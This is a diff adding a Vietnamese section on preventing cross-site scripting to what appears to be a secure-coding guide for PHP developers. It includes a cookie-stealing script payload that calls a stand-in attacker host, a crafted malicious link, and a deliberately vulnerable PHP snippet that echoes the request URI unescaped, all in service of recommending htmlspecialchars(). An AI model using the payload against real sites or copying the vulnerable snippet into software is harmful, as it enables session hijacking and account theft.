@@ -36,6 +36,59 @@ Hãy tưởng tượng cơ sở dữ liệu như một robot chỉ hiểu ngôn 
 
 Kẻ tấn công có thể bỏ qua đăng nhập, đánh cắp tất cả dữ liệu cơ sở dữ liệu (danh sách người dùng, hash mật khẩu), hoặc thậm chí xóa cơ sở dữ liệu.
 
+### 【Ngăn Chặn Tấn Công Cross-Site Scripting (XSS)】
+
+**Tại sao điều này quan trọng?**
+
+Nếu website của bạn giống như một tấm gương phản chiếu trực tiếp nội dung đầu vào của người dùng, thì người dùng có thể nhúng script JavaScript độc hại vào nội dung. Khi người dùng khác duyệt nội dung này, script độc hại sẽ thực thi trong trình duyệt của họ, đánh cắp thông tin của họ. Mã hóa thực thể HTML chuyển đổi các ký tự đặc biệt trong script độc hại (như `<`, `>`) thành văn bản thuần túy vô hại, khiến chúng không thể thực thi.
+
+**Kịch Bản Hacker 😈**
+> Tôi để lại bình luận trong mục bình luận bài viết của bạn: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Văn bản này được lưu trữ trong cơ sở dữ liệu như cũ. Giờ đây bất kỳ người dùng nào đọc bình luận này sẽ có trình duyệt tự động thực thi script này, gửi cookie đăng nhập của họ đến server của tôi. Với cookie, tôi có thể mạo danh họ để đăng nhập website.
+
+**Phương Pháp Tấn Công Nâng Cao: Code của Người Dùng A Có Thể Đánh Cắp Dữ Liệu của Người Dùng B Như Thế Nào?**
+
+Nhiều người thắc mắc: "Kẻ tấn công không sửa đổi website của tôi, vậy làm sao họ có thể đánh cắp dữ liệu của người dùng khác?" Để tôi giải thích bằng một ví dụ hoàn chỉnh:
+
+1. **Kẻ tấn công A tạo link độc hại**
+   ```
+   https://yoursite.com/detail.php?id=1<script>steal()</script>
+   ```
+
+2. **Kẻ tấn công lừa nạn nhân B thông qua kỹ thuật xã hội**
+   - Email: "Hãy xem tác phẩm tuyệt vời của nhiếp ảnh gia này!"
+   - Bài đăng mạng xã hội, bình luận diễn đàn, v.v.
+
+3. **Điều gì xảy ra khi nạn nhân B nhấp vào link?**
+   ```php
+   // Code của bạn (dễ bị tấn công)
+   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
+   
+   // Đầu ra thực tế đến trình duyệt của B
+   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
+   ```
+
+4. **Tại sao họ có thể đánh cắp dữ liệu của B?**
+   - B đã đăng nhập vào website của bạn
+   - Script độc hại chạy dưới **domain của bạn**, vì vậy nó có thể:
+     - Đọc cookie của B (thông tin đăng nhập)
+     - Truy cập localStorage của B
+     - Thực hiện yêu cầu thay mặt B
+     - Sửa đổi nội dung trang (ví dụ: form đăng nhập giả)
+
+**Phép So Sánh Đơn Giản**
+Hãy tưởng tượng website của bạn là một ngân hàng:
+- Kẻ tấn công A đặt một "phiếu rút tiền giả" (script độc hại) trong sảnh ngân hàng
+- Khách hàng B nghĩ nó hợp pháp và nhập mật khẩu
+- A lấy được mật khẩu của B
+
+XSS cho phép kẻ tấn công đặt "phiếu rút tiền giả" (code độc hại) trong "sảnh ngân hàng" của bạn (website).
+
+Đó là lý do tại sao bạn phải sử dụng `htmlspecialchars()` - nó đảm bảo tất cả đầu vào của người dùng được hiển thị dưới dạng văn bản thuần túy, không phải code có thể thực thi.
+
+**Hậu Quả Thảm Khốc 💥**
+
+Đánh cắp tài khoản người dùng hàng loạt, rò rỉ dữ liệu cá nhân, website bị xâm nhập với nội dung lừa đảo hoặc script đào coin.
+
 ---
 
 ## 🔐 Quyền Hạn và Xác Thực
